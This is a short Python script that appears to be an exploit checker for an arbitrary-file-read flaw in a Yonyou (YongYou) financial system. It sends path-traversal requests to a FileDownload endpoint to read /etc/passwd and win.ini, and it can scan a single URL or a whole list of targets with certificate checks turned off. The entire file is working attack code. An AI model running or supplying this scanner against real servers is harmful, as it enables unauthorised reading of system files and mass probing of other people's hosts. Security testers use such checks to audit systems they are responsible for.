import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    win_target = urljoin(url,"/bg/attach/FileDownload?execlPath=C://Windows//win.ini")
    lin_target = urljoin(url, "/bg/attach/FileDownload?execlPath=/etc/passwd")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
    }
    try:
        lin_response = requests.get(lin_target, headers=headers, verify=False)
        win_response = requests.get(win_target, headers=headers, verify=False)
        if lin_response.status_code == 200 and 'root:' in lin_response.text and 'sbin:' in lin_response.text:
            print(f"\033[31mDiscovered:{url}: YongYouFinancial_FileDownload_ArbitraryFileRead!\033[0m")
            return True
        if win_response.status_code == 200 and 'mci extension' in win_response.text and 'extensions' in win_response.text:
            print(f"\033[31mDiscovered:{url}: YongYouFinancial_FileDownload_ArbitraryFileRead!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")